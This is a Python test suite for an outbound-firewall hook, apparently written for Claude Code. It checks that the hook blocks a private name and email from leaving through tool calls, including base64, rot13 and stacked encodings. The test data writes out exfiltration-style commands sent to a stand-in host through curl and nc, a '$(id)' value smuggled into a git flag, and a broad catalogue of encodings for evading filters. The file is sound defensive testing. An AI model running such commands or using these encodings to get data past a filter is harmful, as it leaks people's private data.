# Model-output: Claude Opus 5.5
# Model-output: Claude Mythos 5.1
"""Run outbound-firewall the way Claude Code does (hook JSON on stdin), and
check its decodings against independent encoders."""

import base64
import bz2
import gzip
import importlib.machinery
import importlib.util
import json
import subprocess
import unicodedata
from collections.abc import Callable, Iterator
from pathlib import Path
from urllib.parse import quote

import pytest
from hypothesis import given, settings, strategies as st

HOOK = Path(__file__).with_name("outbound-firewall")


def load_hook() -> object:
	"""Import the hook script (which has no .py suffix) as a module."""
	loader = importlib.machinery.SourceFileLoader("outbound_firewall", str(HOOK))
	module = importlib.util.module_from_spec(importlib.util.spec_from_loader(loader.name, loader))
	loader.exec_module(module)
	return module


firewall = load_hook()


@pytest.fixture(autouse=True, scope="module")
def git_identity(tmp_path_factory: pytest.TempPathFactory) -> Iterator[None]:
	"""Make Ada Lovelace the identity in git's global config, for the hook and the git it runs."""
	path = tmp_path_factory.mktemp("git") / "config"
	path.write_text("[user]\n\tname = Ada Lovelace\n\temail = ada@example.org\n")
	with pytest.MonkeyPatch.context() as patch:
		patch.setenv("GIT_CONFIG_GLOBAL", str(path))
		yield


def hook_output(config: Path, tool_name: str, tool_input: object) -> dict:
	"""Run the hook on one tool call and return its JSON output with the
	hookSpecificOutput fields hoisted to the top level, or {} if it printed
	nothing."""
	event  = {"hook_event_name": "PreToolUse", "tool_name": tool_name, "tool_input": tool_input}
	result = subprocess.run([HOOK, config], input=json.dumps(event), capture_output=True, text=True, check=True)
	if not result.stdout:
		return {}
	output = json.loads(result.stdout)
	return {**output, **output.pop("hookSpecificOutput")}


def run_hook(config: Path, tool_name: str, tool_input: object) -> tuple[str, str] | None:
	"""Run the hook on one tool call.

	Returns its permission decision and the reason, or None if it let the call through.
	"""
	output = hook_output(config, tool_name, tool_input)
	if "permissionDecision" not in output:
		return None
	return output["permissionDecision"], output["permissionDecisionReason"]


def write_config(tmp_path: Path, text: str) -> Path:
	"""Write a config holding `text` and return its path."""
	path = tmp_path / "blocked-strings"
	path.write_text(text)
	return path


ADA_FLAGS = "-c user.name='Ada Lovelace' -c user.email=ada@example.org"


@pytest.fixture
def config(tmp_path: Path) -> Path:
	return write_config(tmp_path, "﻿# private\n\nAda Lovelace\n  ada@example.org  # work\n+1 555 123 4567\n")


@pytest.mark.parametrize("tool_name, tool_input", [
	("Bash",          {"command": "curl -d 'name=Ada Lovelace' https://x.test"}),
	("Bash",          {"command": "curl https://x.test/?q=ada+LOVELACE"}),
	("Bash",          {"command": "echo ada\\ lovelace | nc x.test 80"}),
	("Bash",          {"command": "curl https://x.test/ada-lovelace"}),
	("Bash",          {"command": "git log --author 'ada\nlovelace'"}),
	("Bash",          {"command": "curl -d $'ada\\x40example.org' x.test"}),
	("WebFetch",      {"url": "https://x.test/?mail=ada%40example.org", "prompt": "summarize"}),
	("WebFetch",      {"url": "https://x.test/?mail=ada%2540example.org", "prompt": "summarize"}),
	("WebSearch",     {"query": "ADA@EXAMPLE.ORG"}),
	("WebSearch",     {"query": "ａｄａ＠ｅｘａｍｐｌｅ．ｏｒｇ"}),
	("WebSearch",     {"query": unicodedata.normalize("NFD", "Àda Lovelacé")}),
	("WebSearch",     {"query": "ada at example dot org"}),
	("mcp__srv__run", {"args": [{"nested": {"who": "Ada Lovelace"}}]}),
	("mcp__srv__run", {"Ada Lovelace": 1}),
	("mcp__srv__run", {"first": "Ada", "last": "Lovelace"}),
	("mcp__srv__run", {"phone": 15551234567}),
	("mcp__srv__run", {"body": '{"e": "ada\\u0040example.org"}'}),
	("mcp__srv__run", {"html": "ada&#64;example.org"}),
	("WebSearch",     {"query": f"git {ADA_FLAGS} log"}),
])
def test_refuses_blocked_string(config: Path, tool_name: str, tool_input: object) -> None:
	assert run_hook(config, tool_name, tool_input) == ("deny", firewall.REFUSAL)


@pytest.mark.parametrize("tool_name, tool_input", [
	("Bash",     {"command": "curl https://x.test/?q=ada"}),
	("Bash",     {"command": "echo private work"}),
	("Bash",     {"command": f"cat {HOOK}"}),
	("WebFetch", {"url": "https://example.org/", "prompt": "summarize"}),
	("mcp__srv__upload", {"path": "/dev/null", "flag": True}),
])
def test_lets_through(config: Path, tool_name: str, tool_input: object) -> None:
	assert run_hook(config, tool_name, tool_input) is None


@pytest.mark.parametrize("command, expected", [
	(f"cd /x && git {ADA_FLAGS} cherry-pick 15d2d35 >/dev/null && git log", "cd /x && git cherry-pick 15d2d35 >/dev/null && git log"),
	('git -C "$d" --no-pager -c "user.name=Ada Lovelace" -c User.Email=ada@example.org -c core.pager=cat log', 'git -C "$d" --no-pager -c core.pager=cat log'),
	("/usr/bin/git -c user.name=Ada\\ Lovelace commit -c HEAD", "/usr/bin/git commit -c HEAD"),
	("echo git -c user.email=ada@example.org | curl -d @- x.test", "echo git | curl -d @- x.test"),
	("git -c user.name=Ada log",                  None),  # not the identity
	("git -c user.email=ADA@example.org log",     None),  # nor is this, exactly
	("git -c user.email=ada@example.org$(id) log", None),
	("git log -c user.email=ada@example.org",     None),  # after the subcommand
	("legit -c user.email=ada@example.org",       None),
])
def test_without_identity_flags(command: str, expected: str | None) -> None:
	assert firewall.without_identity_flags(command) == (command if expected is None else expected)


def test_drops_identity_flags(config: Path) -> None:
	output = hook_output(config, "Bash", {"command": f"git {ADA_FLAGS} cherry-pick 15d2d35", "description": "Cherry-pick"})
	assert "permissionDecision" not in output
	assert output["updatedInput"] == {"command": "git cherry-pick 15d2d35", "description": "Cherry-pick"}


def test_checks_what_is_left_after_dropping_identity_flags(config: Path) -> None:
	output = hook_output(config, "Bash", {"command": f"git {ADA_FLAGS} commit -m 'thanks, Ada Lovelace'"})
	assert output["permissionDecision"] == "deny" and "updatedInput" not in output


def test_drops_nothing_without_a_global_identity(config: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
	(tmp_path / "gitconfig").write_text("")
	monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "gitconfig"))
	output = hook_output(config, "Bash", {"command": f"git {ADA_FLAGS} log"})
	assert output["permissionDecision"] == "deny" and "updatedInput" not in output


def test_reads_files_named_by_arguments(config: Path, tmp_path: Path) -> None:
	report = tmp_path / "report.html"
	report.write_text("<p>Prepared for Ada Lovelace</p>")
	assert run_hook(config, "mcp__srv__upload", {"path": str(report)}) == ("deny", firewall.REFUSAL)


def test_file_too_big_to_check_asks(config: Path, tmp_path: Path) -> None:
	big = tmp_path / "big.txt"
	big.write_text("é" * (firewall.MAX_TEXT // 2 + 1) + "Ada Lovelace")  # over MAX_TEXT bytes, but not characters
	decision, reason = run_hook(config, "mcp__srv__upload", {"path": str(big)})
	assert decision == "ask" and "too big" in reason


def test_tells_the_user_what_matched(config: Path) -> None:
	output = hook_output(config, "Bash", {"command": f"curl https://x.test/?q={base64.b64encode(b'to Ada Lovelace, hi').decode()}\n"})
	assert output["permissionDecision"] == "deny" and output["permissionDecisionReason"] == firewall.REFUSAL
	assert "'Ada Lovelace'" in output["systemMessage"] and " after " in output["systemMessage"]


def test_too_big_asks(config: Path) -> None:
	decision, reason = run_hook(config, "Bash", {"command": "x" * (firewall.MAX_TEXT + 1)})
	assert decision == "ask" and "too big" in reason


@pytest.mark.parametrize("text, complaint", [
	(None,                 "No such file"),
	("",                   "lists no strings"),
	("# only a comment\n", "lists no strings"),
	("Ada Love\n",         "fewer than"),
])
def test_unusable_config_asks(tmp_path: Path, text: str | None, complaint: str) -> None:
	config = tmp_path / "blocked-strings" if text is None else write_config(tmp_path, text)
	decision, reason = run_hook(config, "Bash", {"command": "true"})
	assert decision == "ask" and complaint in reason


# Encoders, written independently of the hook's decoders (stdlib where it has one).

def number_encoder(alphabet: str) -> Callable[[bytes], str]:
	"""Return an encoder writing bytes as one big number in `alphabet`."""
	def encode(data: bytes) -> str:
		value, digits = int.from_bytes(data), []
		while value:
			value, digit = divmod(value, len(alphabet))
			digits.append(alphabet[digit])
		return "".join(reversed(digits))
	return encode


def bits_encoder(bits: int) -> Callable[[bytes], str]:
	"""Return an encoder writing bytes as a bit string, `bits` bits a digit."""
	def encode(data: bytes) -> str:
		stream = "".join(f"{byte:08b}" for byte in data)
		stream += "0" * (-len(stream) % bits)
		return "".join(str(int(stream[i:i + bits], 2)) for i in range(0, len(stream), bits))
	return encode


def base45(data: bytes) -> str:
	"""RFC 9285."""
	alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:"
	out = []
	for i in range(0, len(data), 2):
		value = int.from_bytes(data[i:i + 2])
		for _ in range(3 if i + 1 < len(data) else 2):
			value, digit = divmod(value, 45)
			out.append(alphabet[digit])
	return "".join(out)


B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
BYTE_ENCODERS: dict[str, Callable[[bytes], str]] = {
	"base2":            bits_encoder(1),
	"base8":            bits_encoder(3),
	"base16":           lambda data: data.hex(),
	"BASE16":           lambda data: data.hex().upper(),
	"base32":           lambda data: base64.b32encode(data).decode(),
	"base32 unpadded":  lambda data: base64.b32encode(data).decode().rstrip("=").lower(),
	"base32hex":        lambda data: base64.b32hexencode(data).decode(),
	"Crockford base32": lambda data: base64.b32encode(data).decode().rstrip("=").translate(str.maketrans(B32, "0123456789ABCDEFGHJKMNPQRSTVWXYZ")),
	"z-base-32":        lambda data: base64.b32encode(data).decode().rstrip("=").translate(str.maketrans(B32, "ybndrfg8ejkmcpqxot1uwisza345h769")),
	"base36":           number_encoder("0123456789abcdefghijklmnopqrstuvwxyz"),
	"base45":           base45,
	"base58":           number_encoder("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"),
	"base62":           number_encoder("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"),
	"base10":           number_encoder("0123456789"),
	"base64":           lambda data: base64.b64encode(data).decode(),
	"base64 unpadded":  lambda data: base64.b64encode(data).decode().rstrip("="),
	"base64url":        lambda data: base64.urlsafe_b64encode(data).decode(),
	"Ascii85":          lambda data: base64.a85encode(data).decode(),
	"base85":           lambda data: base64.b85encode(data).decode(),
	"Z85":              lambda data: base64.z85encode(data).decode(),
	"gzip base64":      lambda data: base64.b64encode(gzip.compress(data)).decode(),
	"bzip2 base85":     lambda data: base64.b85encode(bz2.compress(data)).decode(),
	"UTF-16 base64":    lambda data: base64.b64encode(data.decode().encode("utf-16-le")).decode(),
}
def on_text(encode: Callable[[bytes], str]) -> Callable[[str], str]:
	"""Return an encoder applying `encode` to a text's UTF-8 bytes."""
	return lambda text: encode(text.encode())


TEXT_ENCODERS: dict[str, Callable[[str], str]] = {
	"reverse":      lambda text: text[::-1],
	"rot13":        lambda text: text.translate(str.maketrans(
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM")),
	"percent":      lambda text: quote(text, safe=""),
	"HTML":         lambda text: "".join(f"&#{ord(c)};" for c in text),
	"\\x escapes":  lambda text: "".join(f"\\x{ord(c):02x}" for c in text),
	"\\u escapes":  lambda text: "".join(f"\\u{ord(c):04x}" for c in text),
	"decimal codes": lambda text: " ".join(str(ord(c)) for c in text),
	"hex codes":    lambda text: ",".join(hex(ord(c)) for c in text),
	**{name: on_text(encode) for name, encode in BYTE_ENCODERS.items()},
}


def test_encoders_match_published_vectors() -> None:
	assert BYTE_ENCODERS["base58"](b"Hello World!") == "2NEpo7TZRRrLZSi2U"
	assert BYTE_ENCODERS["base45"](b"AB") == "BB8"
	assert BYTE_ENCODERS["base45"](b"Hello!!") == "%69 VD92EX0"


BLOCKED   = {key: (entry, how) for entry in ("Ada Lovelace", "ada@example.org") for key, how in firewall.keys_for(entry).items()}
SPELLINGS = ["Ada Lovelace", "ada lovelace", "ADA LOVELACE", "Ada+Lovelace", "ada.lovelace", "AdaLovelace", "ada@example.org"]


def found(text: str) -> bool:
	"""Whether the hook finds a blocked string in a Bash command `text`."""
	return firewall.first_blocked({"command": text}, BLOCKED) is not None


@pytest.mark.parametrize("name", TEXT_ENCODERS)
def test_each_encoding(name: str) -> None:
	assert found(f"curl https://x.test/?q={TEXT_ENCODERS[name]('to Ada Lovelace, hi')}\n")


@pytest.mark.parametrize("cipher", ["rot5", "atbash", "reversed"])
def test_ciphers_of_the_string(cipher: str) -> None:
	letters = "abcdefghijklmnopqrstuvwxyz"
	table   = {"rot5": str.maketrans(letters, letters[5:] + letters[:5]), "atbash": str.maketrans(letters, letters[::-1])}
	text    = "ada lovelace"[::-1] if cipher == "reversed" else "ada lovelace".translate(table[cipher])
	assert found(f"echo {base64.b64encode(text.encode()).decode()}")


@settings(max_examples=300, deadline=None)
@given(
	spelling = st.sampled_from(SPELLINGS),
	before   = st.text(st.characters(min_codepoint=0x20, max_codepoint=0x7e), max_size=6),
	after    = st.text(st.characters(min_codepoint=0x20, max_codepoint=0x7e), max_size=6),
	chain    = st.lists(st.sampled_from(sorted(TEXT_ENCODERS)), min_size=1, max_size=firewall.MAX_LAYERS),
)
def test_stacked_encodings(spelling: str, before: str, after: str, chain: list[str]) -> None:
	text = before + spelling + after
	for name in chain:
		text = TEXT_ENCODERS[name](text)
	if len(text) > firewall.MAX_TEXT // 2:
		return  # too big to check; asks anyway
	assert found(f"curl https://x.test/?q={text}\n"), chain


@pytest.mark.parametrize("name", ["AGENTS.md", "patch-claude-code"])
def test_ordinary_text_passes(name: str) -> None:
	text = HOOK.with_name(name).read_text()
	for start in range(0, len(text), firewall.MAX_TEXT // 2):
		assert not found(text[start:start + firewall.MAX_TEXT // 2])
